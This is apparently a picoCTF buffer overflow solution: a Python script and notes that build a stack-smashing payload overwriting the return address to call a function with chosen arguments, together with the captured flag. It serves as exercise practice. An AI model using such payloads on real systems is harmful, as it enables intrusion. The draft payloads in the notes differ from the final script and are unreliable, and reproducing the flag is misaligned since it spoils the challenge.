'''
arg1 must be 0xEFBEADDE
arg1 stored in ebp+0x8
arg2 must be 0xDEC0ADDE
arg2 stored in ebp+0xc

Buffer size = 100

Exploit:
AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFAAAABBBBCCCC\xcb\x85\x04\x08

echo -e "AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCDDDDEEEEFFFF\x08\x04\x85\xcb" | ./vuln

Expected state:
< esp pointer
arg2
arg1
ret_ebp < ebp pointer
ret_eip < eip pointer

To get to that from:
< esp pointer
other_stuff
ret_ebp < ebp pointer
ret_eip

Flag: picoCTF{addr3ss3s_ar3_3asya4104c14}

'''

import struct

padding = b"A" * 104 + b"AAAABBBB"
eip = struct.pack('I', 0x080485cb)
padding2 = b"CCCC"
arg1 = struct.pack('I', 0xdeadbeef)
arg2 = struct.pack('I', 0xdeadc0de)

print(padding + eip + padding2 + arg1 + arg2)
